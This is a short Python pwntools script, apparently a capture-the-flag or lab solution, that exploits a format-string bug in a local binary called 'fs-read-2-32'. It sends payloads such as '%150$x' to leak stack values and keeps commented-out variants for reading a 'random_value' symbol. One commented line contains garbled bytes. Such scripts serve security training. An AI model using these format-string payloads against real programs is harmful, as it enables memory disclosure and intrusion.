#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-read-2-32")
#addr_rand = p.elf.symbols['random_value']
#print(hex(addr_rand))
print(p.recv())
#buf = p32(addr_rand) + "%20$s"
#144
#buf = "%568x"

#distance = 144
#buf = "%" + "%03d" %distance + "x"
buf = "%150$x"
#buf += " %1$p"
#buf = "%112$x" + "%31$p"
p.sendline(buf)
#line = p.recvline()
#print(repr(line))
#val = line.split(' ')
#print(val)
"""
data = p.recv()
print(repr(data))
value = data.split('')[1][4:8]
value = u32(value)
print(value)
"""
#s = (unpack("?*??0\x88\x0?#??+??",'all',endian='little',sign=True))
#print(hex(s))
p.interactive()

